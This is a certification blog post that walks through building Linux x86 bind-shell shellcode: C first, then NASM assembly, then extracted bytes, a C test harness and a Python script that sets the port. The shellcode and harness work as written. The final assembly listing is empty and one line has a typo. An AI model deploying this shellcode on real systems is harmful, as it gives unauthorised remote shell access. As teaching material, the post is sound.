This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

The first question for the SLAE exam is to create a Bind Shell.  The requirements are:
* Binds to a port
* Execs shell on incoming connection
* Port number should be easily configurable

The proper steps for a Bind Shell are as follows:
1. [C - Creating the socket](#creating-the-socket)
2. [C - Bind the socket to an IP and port](#bind-the-socket-to-an-ip-and-port)
3. [C - Set the socket to listen](#set-the-socket-to-listen)
4. [C - Accept a connection](#accept-a-connection)
5. [C - Redirect output](#redirect-output)
6. [C - Execute a shell](#execute-a-shell)


In order to easily translate the calls in to assembly, lets build the Bind Shell in C first.  Then we will be able to translate it from there.

## Creating a Bind Shell in C

### Creating the socket
Details about the function are in the man page:
```c
int socket(int domain, int type, int protocol);
```
The argument "int domain" specifies a communication domain; this selects the protocol family which will be used for communication.  These families are defined in <sys/socket.h>

We will use IPv4 for our domain
> AF_INET             IPv4 Internet protocols

The constant I will use to specify IPv4 is in:
```c
cat /usr/include/i386-linux-gnu/bits/socket.h | grep _INET

#define PF_INET	2	/* IP protocol family. */
```
The next argument is type, I will be using:
> SOCK_STREAM

Again we will need to identify the constant for SOCK_STREAM and it's value to use for the call, that can be found in:
```c
cat /usr/src/linux-headers-4.15.0-43/include/linux/net.h | grep SOCK_STREAN

* @SOCK_STREAM: stream (connection) socket
  SOCK_STREAM = 1
```
The last argument is protocol, we can pass a 0 in to this argument.

As of right now the call will be:
```c
int sockfd = socket(AF_INET, SOCK_STREAM, 0);
// using the integers, it is:
socket(2, 1, 0);
```
### Bind the socket to an IP and port
After the socket is created, we will need to call the function bind so that our socket binds to the port that we want.
```c
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```
The first argument will be sockfd which comes from the return value of the socket that was just created above.
The addr parameter will need the sockaddr_in struct, which will include address, port number, and family.
```c
struct sockaddr_in {
    sa_family_t    sin_family; /* address family: AF_INET */
    in_port_t      sin_port;   /* port in network byte order */
    struct in_addr sin_addr;   /* internet address */
};

/* Internet address. */
struct in_addr {
    uint32_t       s_addr;     /* address in network byte order */
};
```
The code to create this is as follows:
```c
struct sockaddr_in sock_addr;

sock_addr.sin_family = AF_INET;
sock_addr.sin_port = htons(4444);
sock_addr.sin_addr.s_addr = INADDR_ANY;

bind(sockfd, (struct sockaddr *)&sock_addr, sizeof(sock_addr));
```
Converting these values from their constants--
We know AF_INET is 2.
INADDR_ANY is 0x00000000 (0.0.0.0) and can be found here:
```c
cat /usr/include/netinet/net.h | grep INADDR_ANY

#define INADDR_ANY ((in_addr_t) 0x00000000)
```
### Set the socket to listen
The next step is to call the listen function so that our socket is ready for any incoming connection attempts.
```c
int listen(int sockfd, int backlog);
```
This is pretty straight forward.  Our sockfd parameter is what we made in step1 and backlog will be 0.

Our call is:
```c
listen(sockfd, 0);
```
### Accept a connection
Now that our socket is listening, we can start the process to accept a connection attempt.
```c
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
```
This is also fairly straight forward.  We can use the socket created in step 1 for the first parameter, and just put NULL for the last 2.
Note that this function's return value is important to us here.  We will need the return value in order to keep track of the client connection's file descriptor:
> On success, these system calls return a nonnegative integer that is a file descriptor for the accepted socket.

So our call becomes:
```c
int client_socket = accept(sockfd, NULL, NULL);
```
### Redirect output
In order to get input and send output, we need to redirect stdin, stdout, and stderr to the socket using dup2.
```c
int dup2(int oldfd, int newfd);
```
oldfd will be the client_socket that we accepted and newfd will refer to the integers that represent stdin (0), stdout (1), stderr (2).

Our calls will be:
```c
dup2(client_socket, 0);
dup2(client_socket, 1);
dup2(client_socket, 2);
```

### Execute a shell
Now that everything is set up, we just need to execute the shell using execve:
```c
execve("/bin/sh", NULL, NULL);
```
### Putting it all together
```c
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>

int main() {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in sock_addr;

    sock_addr.sin_family = AF_INET;
    sock_addr.sin_port = htons(4444);
    sock_addr.sin_addr.s_addr = INADDR_ANY;

    bind(sockfd, (struct sockaddr *)&sock_addr, sizeof(sock_addr));

    listen(sockfd, 0);

    int client_socket = accept(sockfd, NULL, NULL);

    dup2(client_socket, 0);
    dup2(client_socket, 1);
    dup2(client_socket, 2);

    execve("/bin/sh", NULL, NULL);
}
```

## Translating to Assembly

The steps are the same as above:
1. [nasm - Creating the socket](#1-creating-the-socket)
2. [nasm - Bind the socket to an IP and port](#2-bind-the-socket-to-an-ip-and-port)
3. [nasm - Set the socket to listen](#3-set-the-socket-to-listen)
4. [nasm - Accept a connection](#4-accept-a-connection)
5. [nasm - Redirect output](#5-redirect-output)
6. [nasm - Execute a shell](#6-execute-a-shell)
7. [nasm - Putting it all together](#7-putting-it-all-together)

A quick reminder of arguments and calls for assembly:
- EAX is used for the syscall number. As with a lot of calls, EAX will store the return value.
  * Syscall numbers can be found in /usr/include/i386-linux-gnu/asm/unistd_32.h
- EBX is used for the first argument to be passed
- ECX is used for the second argument to be passed
- EDX is used for the third argument to be passed
- ESI is used for the fourth argument to be passed
- EDI is used for the fifth argument to be passed
- Any structs can be made by using the stack and pointing to it's address

### 1 Creating the socket

Sockets are handled through socketcall()

http://man7.org/linux/man-pages/man2/socketcall.2.html
```c
int socketcall(int call, unsigned long *args);
```
This means that we will have EAX be our socketcall value (0x66).

EBX will be the call related to socket (bind, listen, accept, etc.)

ECX will be a struct with the args to be passed in to our call.

The call ids can be found at:
```c
cat /usr/include/linux/net.h | grep SYS_

#define SYS_SOCKET	 1		/* sys_socket(2)		*/
#define SYS_BIND	   2		/* sys_bind(2)			*/
#define SYS_CONNECT	3		/* sys_connect(2)		*/
#define SYS_LISTEN	 4		/* sys_listen(2)		*/
#define SYS_ACCEPT	 5		/* sys_accept(2)		*/
```
Looking at our C code, we need to call socket(2, 1, 0);

This will translate to:

    EAX - 0x66 for socketcall

    EBX - 1 for socket

    ECX - address on stack with args 2, 1 0
```asm
; clear registers while avoiding nulls
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

; 0x66 for socketcall
mov al, 0x66
;0x1 for socket
mov bl, 0x1
```
Setting up ECX - our *args parameter - we can use the stack to push the values, then make ecx equal to the stack pointer (esp) so that we have the address for the args stored in ecx.  Note that when using the stack for args in this way, we have to push them in the reverse order since the stack grows down (towards 0).
```asm
; ecx = 0
push ecx
; ebx = 1
push ebx
push 0x2

; point ecx to the stack for args
mov ecx, esp
int 0x80
```
The return value will be sockfd that is stored in EAX.  Since EAX is used for our socketcall argument, we need to move it to a register for safe keeping.  I have decided to use edi.
```asm
mov edi, eax
```
### 2 Bind the socket to an IP and port
Now that we have sockfd, it's time to bind the socket.

As we created earlier, our reference is:

bind(sockfd, (struct sockaddr *)&sock_addr, sizeof(sock_addr));

Just for my own understanding, I'll write out the socketcall format with any structs or objects in {}.

socketcall( SYS_BIND, {sockfd, {AF_INET, 4444, INADDR_ANY}, 0x10} );

EAX - 0x66 - socketcall

EBX - 0x2 - SYS_BIND

ECX - pointing to stack:

STACK: edi (sockfd), point to struct, 0x10, struct{0x2, 0x115C, 0x00000000}

Let's build this in assembly now:
```asm
mov al, 0x66
inc ebx      ; previously set to 0x1 -> increase it to 2

; push struct to stack
push edx       ; INADDR_ANY = 0x0
push 0x5C11    ; port: htons(4444) - 0x5C11
push bx        ; AF_INET = 2

;store reference to struct
mov ecx, esp

; push bind args
push 0x10      ; sizeof(sock_addr) = 0x10
push ecx       ; struct sock_addr
push edi       ; sockfd

mov ecx, esp
int 0x80
```
### 3 Set the socket to listen
The next step is to call listen(sockfd, 0);

This will translate to:

EAX - 0x66 - socketcall

EBX - 0x4 - SYS_LISTEN

ECX - pointing to stack:

STACK: edi, 0x0

Note that on success, bind returns 0x0 into eax which we can now use for our args on the stack as well as sockfd.
```asm
; stack setup
push eax
push edi

; *args
mov ecx, esp

; set up syscall and listen
mov al, 0x66
inc ebx
inc ebx
int 0x80
```
### 4 Accept a connection
Next step is to call accept(sockfd, NULL, NULL);

This translates to:

EAX - 0x66 - socketcall

EBX - 0x5 - SYS_ACCEPT

ECX - pointing to stack:

STACK: edi, 0x0, 0x0

Note that on success, listen returns 0x0 into eax (same as above).
```asm
; stack setup
push eax
push eax
push edi

; *args
mov ecx, esp

; set up syscall and accept
mov al, 0x66
inc ebx
int 0x80
```
### 5 Redirect output
Now that we have accepted the connection, we need to redirect in, out, & err.
The return value for accept is the descriptor for the client connection, which will be used as an argument for dup2 in EBX.  We can just move this from EAX to EBX first.

dup2(client_socket, 0);

dup2(client_socket, 1);

dup2(client_socket, 2);

This translates to:

EAX - 0x3f - dup

EBX - return value from accept

ECX - integer 2, 1, or 0

Since this is the same call 3 times and the only difference is an increasing (*hint* or decreasing) int.. this looks like a loop would be best to use here.

Luckily, our loop only needs to decrease from 2.  ECX can be used as the counter AND the argument, which helps us out a lot here.

Grab the syscall number for dup2:
```c
cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup2
#define __NR_dup2 63
```
There is a conditional jump in assembly called jns which means, as I understand it, "Jump No Sign".  Which will take the jump until the Sign Flag is set.  As an easier description.. Take the jump until the value becomes negative.

This conditional jump is perfect for us because it will include 0 in our loop before exiting.
```asm
        mov ebx, eax    ; client_socket arg
        xor ecx, ecx    ; zero ecx avoiding nulls
        mov cl, 0x2     ; setup counter
dup:
        mov al, 0x3f
        int 0x80        ; dup2(client_socket, [ecx])
        dec ecx
        jns dup
```
### 6 Execute a shell
Now we just need to execute /bin/sh with execve to give the client the shell.

The call will be:

execve("/bin/sh", NULL, NULL);

We have to null terminate the string for "/bin/sh" so we will use the stack to assign it to the proper register.

EDX is still 0'd out so we can keep it the same for an argument and also use it to null terminate ECX.

Note that, for ease of writing, we want 8 characters for our string.  We can do "/bin//sh" to effectively give the same command and have the proper length.  We also want to reverse the string, split it in to 4 character sections and push it on to the stack in hex.
```asm
push edx  ; null terminate the string
push 0x68732f2f ; push hs//
push 0x6e69622f ; push nib/

mov ebx, esp    ; move null terminated string into register

mov ecx, edx    ; 0x0
mov al, 0xB     ; syscall execve
int0x80         ; execve("/bin/sh", NULL, NULL);
```
### 7 Putting It All Together
The final product is:
```asm

NOTE: Originally.. at 0x804809a: "pushw 0x5c11" there WAS two null bytes my first check for this.  It seems I forgot to specify "push word". I ended up going back, fixing it, verifying, and extract bytes to test.

Now, let's extract the bytes to test out the shellcode.
```
objdump -d ./bind_shell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\x43\x52\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x50\x57\x89\xe1\xb0\x66\x43\x43\xcd\x80\x50\x50\x57\x89\xe1\xb0\x66\x43\xcd\x80\x89\xc3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80"
```
Our shellcode wrapper, with our shellcode included, is:
```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\x43\x52\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x50\x57\x89\xe1\xb0\x66\x43\x43\xcd\x80\x50\x50\x57\x89\xe1\xb0\x66\x43\xcd\x80\x89\xc3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80";
main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```
Compile.:
```shell
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```
Now it should work!

Run the file:
```shell
./shellcode
Shellcode Length:  94
```
Connect and issue a command:
```shell
nc -v 127.0.0.1 4444
Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
who
pwoer    tty7         Dec 11 10:13 (:0)
```
It works!

Now we have to make the port adjustable.  In order to do that we'll just write a python script that replaces the port in the shellcode with whatever the user inputs and then outputs the new shellcode.
```python
import struct
import sys

def main():
	if len(sys.argv) != 2:
		print "Usage: {0} PORT".format(sys.argv[0])
		exit()

	port = int(sys.argv[1])
	print port
	# bounds checking
	if not (0 <= port <= 65535):
		print "That's not a real port number!"
		exit()

	# check well known ports
	if port <= 1024:
		print "Reminder: Well known port needs to be run as root"

	port = r'\x' + r'\x'.join(x.encode('hex') for x in struct.pack('!H', port))

	# check nulls
	if r'\x00' in port:
		print 'Null in that port number. Try again.'
		exit()

	shellcode = "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x66\\xb3\\x01\\x51\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\xb0\\x66\\x43\\x52\\x66\\x68" + port + "\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x50\\x57\\x89\\xe1\\xb0\\x66\\x43\\x43\\xcd\\x80\\x50\\x50\\x57\\x89\\xe1\\xb0\\x66\\x43\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xd1\\xb0\\x0b\\xcd\\x80"

	print "Shellcode: " + shellcode

if __name__=="__main__":
	main()
```
This successfuly outputs the new shellcode with the desired port!
